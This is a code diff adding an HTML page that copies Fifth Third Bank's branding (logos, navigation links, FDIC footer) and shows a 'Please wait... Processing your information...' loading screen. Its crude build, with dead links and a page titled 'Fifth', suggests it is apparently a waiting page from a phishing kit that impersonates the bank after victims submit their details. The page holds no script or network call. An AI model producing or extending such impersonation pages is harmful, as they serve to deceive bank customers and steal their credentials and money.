@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fifth</title>
+    <link rel="stylesheet" href="res\css\main.css">
+    <style>
+        .cont {
+            padding: 40px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: 50vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login {
+            background: #fff;
+            padding: 40px 35px 45px;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            max-width: 420px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .login h2 {
+            margin-top: 0;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 1.6rem;
+            color: #1a2a3a;
+        }
+        .login p {
+            margin-top: 0;
+            margin-bottom: 24px;
+            color: #555;
+            font-size: 0.95rem;
+        }
+        .login img {
+            max-width: 80px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        header .logo img {
+            height: 40px;
+            width: auto;
+        }
+        header .logoo img {
+            height: 32px;
+            width: auto;
+        }
+        header .links {
+            font-size: 0.8rem;
+            color: #555;
+        }
+        header .links a {
+            color: #0055a5;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        header .links a:hover {
+            text-decoration: underline;
+        }
+        header .links a:first-child {
+            margin-left: 0;
+        }
+
+        .bottom {
+            padding: 14px 30px;
+            font-size: 0.85rem;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e5e5e5;
+            color: #555;
+            min-height: 20px;
+        }
+
+        footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 30px;
+            background: #f2f4f6;
+            border-top: 1px solid #ddd;
+            font-size: 0.75rem;
+            color: #555;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        footer .logo img {
+            height: 28px;
+            width: auto;
+        }
+        footer p {
+            margin: 0;
+            flex: 1;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            header .links {
+                text-align: center;
+            }
+            .login {
+                padding: 30px 20px;
+            }
+            footer {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ═══ HEADER ═══ -->
+    <header>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+        <div class="logoo">
+            <img src="res\img\logoo.png" alt="logo" />
+        </div>
+        <div class="links">
+            <a href="#">CUSTOMER SERVICE</a> |
+            <a href="#">BRANCH &amp; ATM LOCATOR</a>
+        </div>
+    </header>
+
+    <!-- ═══ EMPTY BREADCRUMB ═══ -->
+    <div class="bottom"></div>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <div class="cont">
+
+        <div class="login">
+            <h2>Please wait...</h2>
+            <p>Processing your information...</p>
+            <img src="res/img/loading.gif" alt="Loading..." />
+        </div>
+
+    </div>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer>
+        <p>
+            Copyright &copy; 2024 Fifth Third Bank, National Association.
+            All Rights Reserved. Member FDIC. FDIC Logo Equal Housing Lender
+        </p>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+    </footer>
+
+</body>
+</html>
